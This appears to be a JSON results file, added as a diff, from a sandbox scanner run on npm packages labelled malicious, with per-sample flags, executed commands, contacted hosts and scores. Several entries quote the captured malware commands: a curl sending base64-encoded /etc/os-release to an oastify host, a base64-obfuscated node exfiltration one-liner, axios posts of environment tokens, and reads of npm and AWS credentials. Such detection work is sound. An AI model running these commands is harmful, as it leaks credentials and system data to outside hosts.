@@ -1,0 +1,973 @@
+[
+  {
+    "sample": "2024-09-20-duckc2-api-v1.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2024-09-20-duckc2-api-v1.0.0/tmp/tmp_po3wjc6/duckc2-api/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "RUNS_NPM": [
+            "[import] npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-strin"
+          ],
+          "DNS_LOOKUP": [
+            "[import] dns server 127.0.0.1",
+            "[import] query raw.githubusercontent.com"
+          ]
+        },
+        "execs": [
+          "/bin/sh -c npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent",
+          "npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent",
+          "node /usr/local/bin/npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent"
+        ],
+        "net": [],
+        "hosts": [
+          "raw.githubusercontent.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "axios",
+          "axios"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=124"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "RUNS_NPM": [
+            "[import] npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-strin"
+          ],
+          "DNS_LOOKUP": [
+            "[import] dns server 127.0.0.1",
+            "[import] query raw.githubusercontent.com"
+          ]
+        },
+        "execs": [
+          "/bin/sh -c npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent",
+          "npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent",
+          "node /usr/local/bin/npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent"
+        ],
+        "net": [],
+        "hosts": [
+          "raw.githubusercontent.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "axios",
+          "axios"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=124"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP",
+      "RUNS_NPM"
+    ],
+    "dynamic_score": 50,
+    "dynamic_verdict": "suspicious",
+    "static_score": 100,
+    "gap": ""
+  },
+  {
+    "sample": "2024-11-20-spid-gc-config-v5.1.4",
+    "label": "malicious",
+    "root": "../samples/extracted/2024-11-20-spid-gc-config-v5.1.4/tmp/tmpwxvz7d39/spid-gc-config/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query ipinfo.io",
+            "[install] query discord.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query ipinfo.io",
+            "[import] query discord.com"
+          ]
+        },
+        "execs": [
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "ipinfo.io",
+          "discord.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query ipinfo.io",
+            "[install] query discord.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query ipinfo.io",
+            "[import] query discord.com"
+          ]
+        },
+        "execs": [
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "ipinfo.io",
+          "discord.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP"
+    ],
+    "dynamic_score": 35,
+    "dynamic_verdict": "suspicious",
+    "static_score": 50,
+    "gap": ""
+  },
+  {
+    "sample": "2025-03-25-epic-comment-rating-v1.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-03-25-epic-comment-rating-v1.0.0/var/folders/rs/52vst_5924nc0zz5ccww9tl80000gp/T/tmpmg9y6l71/epic-comment-rating/package",
+    "profiles": {
+      "laptop": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [],
+    "dynamic_score": 0,
+    "dynamic_verdict": "low",
+    "static_score": 0,
+    "gap": ""
+  },
+  {
+    "sample": "2025-05-25-blocks-nextjs-v9999.9999.10000",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-05-25-blocks-nextjs-v9999.9999.10000/tmp/tmpjjvj4uku/blocks-nextjs/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[import] dns server 127.0.0.1",
+            "[import] query geyybafvoogqfnn3xmadws172y8pwskh.oastify.com",
+            "[import] resolve failed: geyybafvoogqfnn3xmadws172y8pwskh.oastify.com"
+          ]
+        },
+        "execs": [],
+        "net": [],
+        "hosts": [
+          "geyybafvoogqfnn3xmadws172y8pwskh.oastify.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[import] dns server 127.0.0.1",
+            "[import] query geyybafvoogqfnn3xmadws172y8pwskh.oastify.com",
+            "[import] resolve failed: geyybafvoogqfnn3xmadws172y8pwskh.oastify.com"
+          ]
+        },
+        "execs": [],
+        "net": [],
+        "hosts": [
+          "geyybafvoogqfnn3xmadws172y8pwskh.oastify.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP"
+    ],
+    "dynamic_score": 35,
+    "dynamic_verdict": "suspicious",
+    "static_score": 20,
+    "gap": "STATIC-CLEAN, DYNAMIC-FLAGGED"
+  },
+  {
+    "sample": "2025-06-19-mattermost-hardware-keyboard-v1.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-06-19-mattermost-hardware-keyboard-v1.0.0/tmp/tmpqk9kshmn/mattermost-hardware-keyboard/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com",
+            "[install] resolve failed: bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com"
+          ]
+        },
+        "execs": [
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com",
+            "[install] resolve failed: bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com"
+          ]
+        },
+        "execs": [
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP"
+    ],
+    "dynamic_score": 35,
+    "dynamic_verdict": "suspicious",
+    "static_score": 60,
+    "gap": ""
+  },
+  {
+    "sample": "2025-07-08-tailwind-base-theme-v1.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-07-08-tailwind-base-theme-v1.0.0/tmp/tmphiel5v10/tailwind-base-theme/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "NETWORK_INTENT": [
+            "[import] CALL axios.post(\"https://ip-check-server.vercel.app/api/ip-check/208\", {\"USER\":\"dev\",\"NODE_VERSION\":\"20.20.2\",\"HOSTNAME\":\"dev-macbook\",\"YARN_VERSION\":\"",
+            "[import] CALL axios.post(\"https://ip-check-server.vercel.app/api/ip-check/208\", {\"USER\":\"dev\",\"NODE_VERSION\":\"20.20.2\",\"HOSTNAME\":\"dev-macbook\",\"YARN_VERSION\":\""
+          ]
+        },
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [
+          "https://ip-check-server.vercel.app/api/ip-check/208"
+        ],
+        "files": [],
+        "stubbed": [
+          "axios",
+          "debug",
+          "axios",
+          "axios",
+          "debug",
+          "axios"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "NETWORK_INTENT": [
+            "[import] CALL axios.post(\"https://ip-check-server.vercel.app/api/ip-check/208\", {\"GITHUB_TOKEN\":\"ghp_CANARY000000000000000000000000000000\",\"USER\":\"runner\",\"CI\":",
+            "[import] CALL axios.post(\"https://ip-check-server.vercel.app/api/ip-check/208\", {\"GITHUB_TOKEN\":\"ghp_CANARY000000000000000000000000000000\",\"USER\":\"runner\",\"CI\":"
+          ]
+        },
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [
+          "https://ip-check-server.vercel.app/api/ip-check/208"
+        ],
+        "files": [],
+        "stubbed": [
+          "axios",
+          "debug",
+          "axios",
+          "axios",
+          "debug",
+          "axios"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "NETWORK_INTENT"
+    ],
+    "dynamic_score": 35,
+    "dynamic_verdict": "suspicious",
+    "static_score": 20,
+    "gap": "STATIC-CLEAN, DYNAMIC-FLAGGED"
+  },
+  {
+    "sample": "2025-08-13-epc-node-web-client-v10.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-08-13-epc-node-web-client-v10.0.0/tmp/tmp7efhdg97/epc-node-web-client/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query wvzo30h2.h1.ci",
+            "[install] resolve failed: wvzo30h2.h1.ci"
+          ]
+        },
+        "execs": [
+          "sh -c node -e \\\"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dnpvMzBoMi5oMS5jaTo4ODQzLw==', 'base64').toString('ascii') + '?user=' + process.env.USER + '&path=' + process.cwd()",
+          "node -e const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dnpvMzBoMi5oMS5jaTo4ODQzLw==', 'base64').toString('ascii') + '?user=' + process.env.USER + '&path=' + process.cwd() + '&hos"
+        ],
+        "net": [],
+        "hosts": [
+          "wvzo30h2.h1.ci"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query wvzo30h2.h1.ci",
+            "[install] resolve failed: wvzo30h2.h1.ci"
+          ]
+        },
+        "execs": [
+          "sh -c node -e \\\"const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dnpvMzBoMi5oMS5jaTo4ODQzLw==', 'base64').toString('ascii') + '?user=' + process.env.USER + '&path=' + process.cwd()",
+          "node -e const https = require('https'); const url = Buffer.from('aHR0cHM6Ly93dnpvMzBoMi5oMS5jaTo4ODQzLw==', 'base64').toString('ascii') + '?user=' + process.env.USER + '&path=' + process.cwd() + '&hos"
+        ],
+        "net": [],
+        "hosts": [
+          "wvzo30h2.h1.ci"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP"
+    ],
+    "dynamic_score": 35,
+    "dynamic_verdict": "suspicious",
+    "static_score": 55,
+    "gap": ""
+  },
+  {
+    "sample": "2025-09-14-graphql-sequelize-teselagen-v5.3.8",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-09-14-graphql-sequelize-teselagen-v5.3.8/tmp/tmpyn626mnf/graphql-sequelize-teselagen/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "CRED_ACCESS": [
+            "[install] /home/dev/.npmrc",
+            "[install] /home/dev/.aws/credentials",
+            "[install] /home/dev/.aws/config (missing)"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query registry.npmjs.org",
+            "[install] query api.github.com",
+            "[install] query sts.us-east-1.amazonaws.com"
+          ],
+          "NETWORK_CONNECT": [
+            "[install] 169.254.169.254:80"
+          ]
+        },
+        "execs": [
+          "sh -c node bundle.js",
+          "node bundle.js",
+          "/bin/sh -c gh auth token",
+          "/bin/sh -c gcloud config config-helper --format json"
+        ],
+        "net": [
+          "169.254.169.254:80"
+        ],
+        "hosts": [
+          "registry.npmjs.org",
+          "api.github.com",
+          "sts.us-east-1.amazonaws.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "lodash",
+          "lodash",
+          "graphql",
+          "bluebird",
+          "graphql-relay",
+          "graphql",
+          "lodash",
+          "lodash/camelCase",
+          "bluebird",
+          "graphql",
+          "graphql",
+          "graphql/language",
+          "graphql",
+          "graphql",
+          "graphql-relay",
+          "lodash",
+          "lodash",
+          "graphql",
+          "bluebird",
+          "graphql-relay",
+          "graphql",
+          "lodash",
+          "lodash/camelCase",
+          "bluebird",
+          "graphql",
+          "graphql",
+          "graphql/language",
+          "graphql",
+          "graphql",
+          "graphql-relay"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query api.github.com",
+            "[install] query registry.npmjs.org",
+            "[install] query sts.us-east-1.amazonaws.com"
+          ],
+          "CRED_ACCESS": [
+            "[install] /home/runner/.aws/credentials",
+            "[install] /home/runner/.aws/config (missing)"
+          ],
+          "NETWORK_CONNECT": [
+            "[install] 169.254.169.254:80"
+          ]
+        },
+        "execs": [
+          "sh -c node bundle.js",
+          "node bundle.js",
+          "/bin/sh -c gcloud config config-helper --format json"
+        ],
+        "net": [
+          "169.254.169.254:80"
+        ],
+        "hosts": [
+          "api.github.com",
+          "registry.npmjs.org",
+          "sts.us-east-1.amazonaws.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "lodash",
+          "lodash",
+          "graphql",
+          "bluebird",
+          "graphql-relay",
+          "graphql",
+          "lodash",
+          "lodash/camelCase",
+          "bluebird",
+          "graphql",
+          "graphql",
+          "graphql/language",
+          "graphql",
+          "graphql",
+          "graphql-relay",
+          "lodash",
+          "lodash",
+          "graphql",
+          "bluebird",
+          "graphql-relay",
+          "graphql",
+          "lodash",
+          "lodash/camelCase",
+          "bluebird",
+          "graphql",
+          "graphql",
+          "graphql/language",
+          "graphql",
+          "graphql",
+          "graphql-relay"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "CRED_ACCESS",
+      "DNS_LOOKUP",
+      "NETWORK_CONNECT"
+    ],
+    "dynamic_score": 100,
+    "dynamic_verdict": "malicious",
+    "static_score": 40,
+    "gap": ""
+  },
+  {
+    "sample": "2025-09-15-ng-imports-checker-v0.0.9",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-09-15-ng-imports-checker-v0.0.9/tmp/tmpeli4rc5h/ng-imports-checker/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "CRED_ACCESS": [
+            "[install] /home/dev/.npmrc",
+            "[install] /home/dev/.aws/credentials",
+            "[install] /home/dev/.aws/config (missing)"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query registry.npmjs.org",
+            "[install] query api.github.com",
+            "[install] query sts.us-east-1.amazonaws.com"
+          ],
+          "NETWORK_CONNECT": [
+            "[install] 169.254.169.254:80"
+          ]
+        },
+        "execs": [
+          "sh -c node bundle.js",
+          "node bundle.js",
+          "/bin/sh -c gh auth token",
+          "/bin/sh -c gcloud config config-helper --format json"
+        ],
+        "net": [
+          "169.254.169.254:80"
+        ],
+        "hosts": [
+          "registry.npmjs.org",
+          "api.github.com",
+          "sts.us-east-1.amazonaws.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "tslib",
+          "tslib",
+          "glob",
+          "chalk",
+          "tslib",
+          "tslib",
+          "glob",
+          "chalk"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query api.github.com",
+            "[install] query registry.npmjs.org",
+            "[install] query sts.us-east-1.amazonaws.com"
+          ],
+          "CRED_ACCESS": [
+            "[install] /home/runner/.aws/credentials",
+            "[install] /home/runner/.aws/config (missing)"
+          ],
+          "NETWORK_CONNECT": [
+            "[install] 169.254.169.254:80"
+          ]
+        },
+        "execs": [
+          "sh -c node bundle.js",
+          "node bundle.js",
+          "/bin/sh -c gcloud config config-helper --format json"
+        ],
+        "net": [
+          "169.254.169.254:80"
+        ],
+        "hosts": [
+          "api.github.com",
+          "registry.npmjs.org",
+          "sts.us-east-1.amazonaws.com"
+        ],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "tslib",
+          "tslib",
+          "glob",
+          "chalk",
+          "tslib",
+          "tslib",
+          "glob",
+          "chalk"
+        ],
+        "exit": [
+          "install_exit=124",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "CRED_ACCESS",
+      "DNS_LOOKUP",
+      "NETWORK_CONNECT"
+    ],
+    "dynamic_score": 100,
+    "dynamic_verdict": "malicious",
+    "static_score": 30,
+    "gap": "STATIC-CLEAN, DYNAMIC-FLAGGED"
+  },
+  {
+    "sample": "2025-11-17-calculator-40ed-v4.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-11-17-calculator-40ed-v4.0.0/tmp/tmp9vtgs_kp/calculator-40ed/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "SUSPICIOUS_EXEC": [
+            "[install] base64 -w0",
+            "[install] curl https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTk"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query betsh1pquv6xorejopwm361en5txho5d.oastify.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query betsh1pquv6xorejopwm361en5txho5d.oastify.com",
+            "[install] resolve failed: betsh1pquv6xorejopwm361en5txho5d.oastify.com"
+          ]
+        },
+        "execs": [
+          "sh -c curl \\\"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release | base64 -w0`\\\"",
+          "base64 -w0",
+          "cat /etc/os-release",
+          "curl https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTkFNRT0iRGViaWFuIEdOVS9MaW51eCIKVkVSU0lPTl9JRD0iMTIiClZFUlNJT049IjEyIChib29rd29ybS",
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "betsh1pquv6xorejopwm361en5txho5d.oastify.com"
+        ],
+        "urls": [
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/",
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTkFNRT0iRGViaWFuIEdOVS9MaW51eCIKVkVSU0lPTl9JRD0iMTIiClZFUlNJT049IjEyIChib29rd29ybSkiClZFUlNJT05fQ09ERU5BTUU9Ym9va3dvcm0KSUQ9ZGViaWFuCkhPTUVfVVJMPSJodHRwczovL3d3dy5kZWJpYW4ub3JnLyIKU1VQUE9"
+        ],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=1",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "SUSPICIOUS_EXEC": [
+            "[install] base64 -w0",
+            "[install] curl https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTk"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 127.0.0.1",
+            "[install] query betsh1pquv6xorejopwm361en5txho5d.oastify.com",
+            "[import] dns server 127.0.0.1",
+            "[import] query betsh1pquv6xorejopwm361en5txho5d.oastify.com",
+            "[install] resolve failed: betsh1pquv6xorejopwm361en5txho5d.oastify.com"
+          ]
+        },
+        "execs": [
+          "sh -c curl \\\"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release | base64 -w0`\\\"",
+          "base64 -w0",
+          "cat /etc/os-release",
+          "curl https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTkFNRT0iRGViaWFuIEdOVS9MaW51eCIKVkVSU0lPTl9JRD0iMTIiClZFUlNJT049IjEyIChib29rd29ybS",
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [
+          "betsh1pquv6xorejopwm361en5txho5d.oastify.com"
+        ],
+        "urls": [
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/",
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYmlhbiBHTlUvTGludXggMTIgKGJvb2t3b3JtKSIKTkFNRT0iRGViaWFuIEdOVS9MaW51eCIKVkVSU0lPTl9JRD0iMTIiClZFUlNJT049IjEyIChib29rd29ybSkiClZFUlNJT05fQ09ERU5BTUU9Ym9va3dvcm0KSUQ9ZGViaWFuCkhPTUVfVVJMPSJodHRwczovL3d3dy5kZWJpYW4ub3JnLyIKU1VQUE9"
+        ],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=1",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP",
+      "SUSPICIOUS_EXEC"
+    ],
+    "dynamic_score": 60,
+    "dynamic_verdict": "suspicious",
+    "static_score": 100,
+    "gap": ""
+  },
+  {
+    "sample": "2025-12-18-npe-toolkit-server-deps-v1.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-12-18-npe-toolkit-server-deps-v1.0.0/tmp/tmp9399hq81/npe-toolkit-server-deps/package",
+    "profiles": {
+      "laptop": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [],
+    "dynamic_score": 0,
+    "dynamic_verdict": "low",
+    "static_score": 0,
+    "gap": ""
+  },
+  {
+    "sample": "2026-01-28-monorepo-cop-v9.9.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2026-01-28-monorepo-cop-v9.9.0/tmp/tmp_e1njani/monorepo-cop/package",
+    "profiles": {
+      "laptop": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [],
+    "dynamic_score": 0,
+    "dynamic_verdict": "low",
+    "static_score": 0,
+    "gap": ""
+  },
+  {
+    "sample": "2026-05-19-echarts-for-react-v3.0.7",
+    "label": "malicious",
+    "root": "../samples/extracted/2026-05-19-echarts-for-react-v3.0.7/tmp/tmpr33jque0/echarts-for-react/package",
+    "profiles": {
+      "laptop": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "tslib",
+          "echarts",
+          "tslib",
+          "react",
+          "size-sensor",
+          "tslib",
+          "fast-deep-equal",
+          "tslib",
+          "echarts",
+          "tslib",
+          "react",
+          "size-sensor",
+          "tslib",
+          "fast-deep-equal"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {},
+        "execs": [],
+        "net": [],
+        "hosts": [],
+        "urls": [],
+        "files": [],
+        "stubbed": [
+          "tslib",
+          "echarts",
+          "tslib",
+          "react",
+          "size-sensor",
+          "tslib",
+          "fast-deep-equal",
+          "tslib",
+          "echarts",
+          "tslib",
+          "react",
+          "size-sensor",
+          "tslib",
+          "fast-deep-equal"
+        ],
+        "exit": [
+          "install_exit=0",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [],
+    "dynamic_score": 0,
+    "dynamic_verdict": "low",
+    "static_score": 0,
+    "gap": ""
+  }
+]
